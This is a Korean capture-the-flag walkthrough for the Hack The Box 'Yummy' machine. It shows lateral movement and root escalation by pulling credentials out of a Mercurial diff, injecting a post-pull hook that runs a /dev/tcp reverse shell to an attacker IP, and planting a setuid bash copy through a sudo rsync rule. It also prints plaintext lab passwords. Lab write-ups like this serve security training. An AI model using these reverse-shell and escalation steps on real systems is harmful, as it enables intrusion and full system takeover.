![www-data](/assets/htb-linux/yummy/www-data-shell.png)


## www-data → qa Lateral Movement

`www-data` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
www-data@yummy:/root$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

### Enumerating the Mercurial Repository

이후 `/var/www/app-qatesting` 경로로 이동하여 디렉터리 목록을 확인한 결과, **Mercurial 저장소 디렉토리인 `.hg` 가 존재**하는 것을 확인하였다:

```bash
www-data@yummy:~/app-qatesting$ ls -al

total 40
drwxrwx--- 7 www-data qa        4096 May 28  2024 .
drwxr-xr-x 3 www-data www-data  4096 Oct 23 05:57 ..
-rw-rw-r-- 1 qa       qa       10852 May 28  2024 app.py
drwxr-xr-x 3 qa       qa        4096 May 28  2024 config
drwxrwxr-x 6 qa       qa        4096 May 28  2024 .hg
drwxr-xr-x 3 qa       qa        4096 May 28  2024 middleware
drwxr-xr-x 6 qa       qa        4096 May 28  2024 static
drwxr-xr-x 2 qa       qa        4096 May 28  2024 templates
```

`hg log --user qa` 명령어를 통해 **Mercurial 저장소에서 `qa` 사용자가 수행한 커밋 내역**을 확인하였다.

이를 통해 해당 사용자가 이전에 여러 보안 관련 패치를 적용한 이력이 있음을 확인할 수 있었다:

```bash
www-data@yummy:~/app-qatesting$ hg log --user qa

changeset:   9:f3787cac6111
tag:         tip
user:        qa
date:        Tue May 28 10:37:16 2024 -0400
summary:     attempt at patching path traversal

changeset:   8:0bbf8464d2d2
user:        qa
date:        Tue May 28 10:34:38 2024 -0400
summary:     removed comments

changeset:   7:2ec0ee295b83
user:        qa
date:        Tue May 28 10:32:50 2024 -0400
summary:     patched SQL injection vuln

changeset:   6:f87bdc6c94a8
user:        qa
date:        Tue May 28 10:27:32 2024 -0400
summary:     patched signature vuln
```

### Extracting Credentials via hg diff

`changeset: 9` 의 변경사항(`diff`)을 확인한 결과, 이전 커밋에서 **제거된 MySQL 접속 정보가 노출**되어 있었음을 확인할 수 있었다:

```bash
www-data@yummy:~/app-qatesting$ hg diff -c 9

diff -r 0bbf8464d2d2 -r f3787cac6111 app.py
--- a/app.py    Tue May 28 10:34:38 2024 -0400
+++ b/app.py    Tue May 28 10:37:16 2024 -0400
@@ -19,8 +19,8 @@
 
 db_config = {
     'host': '127.0.0.1',
-    'user': 'qa',
-    'password': 'jPAd!XQCtn8Oc@2B',
+    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
     'database': 'yummy_db',
     'cursorclass': pymysql.cursors.DictCursor,
     'client_flag': CLIENT.MULTI_STATEMENTS
@@ -135,7 +135,7 @@
     temp_dir = tempfile.mkdtemp()
     current_date_time = datetime.now()
     formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")
-
+    ## SKIP ....
```

위 내용으로부터, 이전에 `qa` 계정이 사용되었고 해당 비밀번호로는 `jPAd!XQCtn8Oc@2B` 가 사용되었음을 알 수 있다.

이후 `su` 명령어를 이용해 `qa` 사용자로 전환한 결과, `qa` 권한의 셸 획득에 성공하였다.

![qa](/assets/htb-linux/yummy/qa-shell.png)

## qa → dev Lateral Movement

`qa` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
qa@yummy:/var/www/app-qatesting$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

### Discovering Mercurial Configuration

이후 `qa` 의 홈 디렉토리로 이동하여 `ls -al` 명령어를 실행한 결과, Mercurial 설정 파일인 `.hgrc` 파일이 존재함을 확인할 수 있었다:

```bash
qa@yummy:/var/www/app-qatesting$ cd ~

qa@yummy:~$ ls -al

total 44
drwxr-x--- 6 qa   qa   4096 Sep 30  2024 .
drwxr-xr-x 4 root root 4096 May 27  2024 ..
lrwxrwxrwx 1 root root    9 May 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 qa   qa    220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 qa   qa   3771 May 27  2024 .bashrc
drwx------ 2 qa   qa   4096 Sep 30  2024 .cache
drwx------ 3 qa   qa   4096 May 28  2024 .gnupg
-rw-rw-r-- 1 qa   qa    728 May 29  2024 .hgrc
drwxrwxr-x 3 qa   qa   4096 May 27  2024 .local
-rw-r--r-- 1 qa   qa    807 Mar 31  2024 .profile
drwx------ 2 qa   qa   4096 May 28  2024 .ssh
-rw-r----- 1 root qa     33 Oct 21 18:00 user.txt
```

`.hgrc` 파일을 확인한 결과, Mercurial 설정 정보 중 [trusted] 항목에 `dev` 사용자가 포함되어 있는 것을 확인할 수 있었다:

```bash
qa@yummy:~$ cat .hgrc

# example user config (see 'hg help config' for more info)
[ui]
# name and email, e.g.
# username = Jane Doe <jdoe@example.com>
username = qa

# We recommend enabling tweakdefaults to get slight improvements to
# the UI over time. Make sure to set HGPLAIN in the environment when
# writing scripts!
# tweakdefaults = True

# uncomment to disable color in command output
# (see 'hg help color' for details)
# color = never

# uncomment to disable command output pagination
# (see 'hg help pager' for details)
# paginate = never

[extensions]
# uncomment the lines below to enable some popular extensions
# (see 'hg help extensions' for more info)
#
# histedit =
# rebase =
# uncommit =
[trusted]
users = qa, dev
groups = qa, dev
```

이 설정은 **Mercurial 저장소 내에서 dev 사용자가 신뢰된 사용자(trusted user)** 로 등록되어 있음을 의미한다. 

이를 통해 향후 dev 계정과 연관된 정보 유출 가능성이나 권한 상호작용 여부를 유추해볼 수 있다.

### Exploiting the hg Hook via Sudo

이후 `qa` 사용자로 `sudo -l` 명령어를 실행한 결과, 다음과 같은 권한이 부여되어 있었다:

```bash
qa@yummy:~$ sudo -l

[sudo] password for qa: jPAd!XQCtn8Oc@2B

Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```

위 결과를 통해 `qa` 사용자는 `sudo` 를 통해 `dev` 권한으로 `hg pull` 명령어를 실행할 수 있으며, **Mercurial의 hook 기능을 악용해 RCE**로 이어질 수 있음을 확인하였다.

`/tmp` 디렉토리로 이동해 Mercurial 저장소를 초기화하였다:

```bash
qa@yummy:~$ cd /tmp

qa@yummy:/tmp$ hg init
```

`hg init` 으로 생성된 파일 `.hg` 디렉토리에 충분한 권한을 부여한 뒤:

```bash
qa@yummy:/tmp$ chmod 777 -R .hg/
```

리버스 셸을 실행할 스크립트를 `/tmp/revshell.sh` 로 작성하고 실행 권한을 부여하였다:

```bash
qa@yummy:/tmp$ printf '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.9/9003 0>&1' | tee revshell.sh

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/9003 0>&1

qa@yummy:/tmp$ chmod +x revshell.sh
```

`pull` 명령 시 자동 실행되도록 `.hg/hgrc` 설정 파일에 **post-pull hook 을 삽입**하였다:

```bash
qa@yummy:/tmp$ printf '[hooks]\npost-pull = /tmp/revshell.sh' | tee .hg/hgrc
```

공격자의 터미널에서 `nc` 로 리버스 셸을 대기시킨 후:

```bash
$ nc -lvnp 9003
```

`sudo` 를 통해 `dev` 권한으로 `hg pull` 명령을 실행하였다:

```bash
sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```

정상적으로 `dev` 사용자 권한의 셸을 획득하는 데 성공하였다.

![dev](/assets/htb-linux/yummy/dev-shell.png)

## dev → root Lateral Movement

`dev` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
dev@yummy:/tmp$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

### Enumerating Sudo Permissions

`dev` 사용자로 `sudo -l` 명령어를 실행한 결과, 다음과 같은 권한이 부여되어 있었다:

```bash
dev@yummy:/tmp$ sudo -l

Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg
        /home/dev/app-production/* /opt/app/
```

이 명령어는 --exclude=.hg 옵션을 제외한 `/home/dev/app-production/` 디렉토리 내 모든 파일을 `/opt/app/` 으로 복사하며, 이 과정은 `root` 권한으로 수행된다.

따라서 `/home/dev/app-production/` 내부에 `--rsync` 명령 실행 시에 해석될 수 있는 심볼릭 링크 또는 파일을 악용하는 방식으로 `/opt/app/` 내부에 `root` 권한으로 파일을 작성하거나 명령을 실행하게 유도할 수 있다.

### Exploiting Rsync for Privilege Escalation

이를 위해 `/home/dev/app-production/` 디렉토리로 이동 후 `/bin/bash` 바이너리를 복사하여, `root shell` 로 사용할 파일을 생성하였다:

```bash
dev@yummy:/tmp$ cd /home/dev/app-production

dev@yummy:~/app-production$ cp /bin/bash root-shell
```

이후 해당 파일에 `setuid` 권한을 부여하여, 실행 시 `root` 권한을 획득할 수 있도록 설정하였다:

```bash
dev@yummy:~/app-production$ chmod 4777 root-shell
```

마지막으로 `--chown=root` 옵션을 사용하여 `root` 소유로 복사되도록 하여, 루트 권한의 바이너리를 `/opt/app/` 경로에 생성하였다:

```bash
dev@yummy:~/app-production$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/root-shell --chown=root /opt/app/
```

이후 `/opt/app/` 디렉토리를 `ls` 명령어로 확인한 결과, 소유자가 `root`인 `root-shell` 파일이 성공적으로 복사되어 있는 것을 확인할 수 있다:

```bash
dev@yummy:~/app-production$ ls -al /opt/app

total 1456
drwxrwxr-x 7 root     www-data    4096 Oct 23 08:41 .
drwxr-xr-x 3 root     root        4096 Sep 30  2024 ..
-rw-r--r-- 1 root     root       11979 Sep 25  2024 app.py
drwxr-xr-x 3 root     root        4096 Sep 30  2024 config
drwxr-xr-x 3 root     root        4096 Sep 30  2024 middleware
drwxrwxr-x 2 www-data www-data    4096 Sep 30  2024 __pycache__
-rwsrwxrwx 1 root     dev      1446024 Oct 23 08:41 root-shell
drwxr-xr-x 6 root     root        4096 Sep 30  2024 static
drwxr-xr-x 2 root     root        4096 Sep 30  2024 templates
```

`root-shell` 바이너리를 `-p` 옵션으로 실행함으로써 root 권한의 셸을 획득할 수 있었다.

![root](/assets/htb-linux/yummy/root-shell.png)

최종적으로 `/root/root.txt` 파일을 읽어 플래그를 획득하였다:

![flag](/assets/htb-linux/yummy/flag.png)